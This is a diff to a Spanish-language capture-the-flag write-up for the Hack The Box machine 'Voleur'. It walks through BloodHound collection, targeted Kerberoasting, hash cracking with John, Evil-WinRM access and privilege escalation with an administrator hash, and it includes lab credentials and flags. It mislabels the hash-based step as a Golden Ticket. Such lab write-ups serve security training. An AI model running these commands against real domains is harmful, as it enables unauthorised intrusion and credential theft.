@@ -178,10 +178,14 @@ python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx
 |-------------------------|
 
 🔄 Movimiento Lateral
+
+
 🩸 Análisis con BloodHound
 
+```
 bash
 bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k
+```
 
 🎯 Hallazgos Clave:
 
@@ -191,43 +195,68 @@ bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10
 
 🔥 Ataque de Kerberoasting Dirigido
 
+```
 bash
 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
+```
 
 🔨 Crackeo del Hash TGS
 
+```
 bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
 
 ¡Contraseña de svc_winrm Descubierta!: AFireInsidedeOzarctica980219afi
+
+
 💻 Acceso al Sistema via WinRM
 
-
+```
 bash
 evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB
+```
+
 
 🚩 Bandera de Usuario:
 
+
+```
 powershell
 *Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
 d4d8e7f5c3b1a9e8f7c6d5e4f3a2b1c0
+```
+
+
 
 ⬆️ Escalada de Privilegios
+
+
+
+
+
 👑 Método Directo (Golden Ticket)
 
+
+```
 bash
 getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
+```
 
+```
 bash
 export KRB5CCNAME=administrator.ccache
 evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB
+```
+
 
 🏁 Bandera de Administrador:
 
+```
 powershell
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 95dbb03a9bd57d472d0c5b20237c6695
-
+```
 📚 Lecciones Aprendidas
 
     Autenticación Kerberos:
@@ -243,13 +272,17 @@ powershell
     Es crucial monitorear los logs del Centro de Distribución de Claves (KDC) para detectar actividades sospechosas como múltiples solicitudes TGS.
 
 🛠️ Herramientas Utilizadas
-Herramienta	Función Principal
-Nmap	Escaneo de puertos y servicios
-BloodHound-Python	Mapeo de relaciones en Active Directory
-John the Ripper	Crackeo de contraseñas
-Impacket	Ejecución de ataques a Kerberos
-Evil-WinRM	Conexión remota a servidores WinRM
-office2john	Extracción de hashes de archivos de Office
+
+|---------------------------------------------------------------|
+|Herramienta	  |Función Principal                            |
+|Nmap	          |Escaneo de puertos y servicios               |
+|BloodHound-Python|Mapeo de relaciones en Active Directory      |
+|John the Ripper  |Crackeo de contraseñas                       |
+|Impacket	  |Ejecución de ataques a Kerberos              |
+|Evil-WinRM	  |Conexión remota a servidores WinRM           |
+|office2john	  |Extracción de hashes de archivos de Office   |
+|---------------------------------------------------------------|
+
 🔗 Recursos Recomendados
 
     Hoja de Referencia de Ataques Kerberos
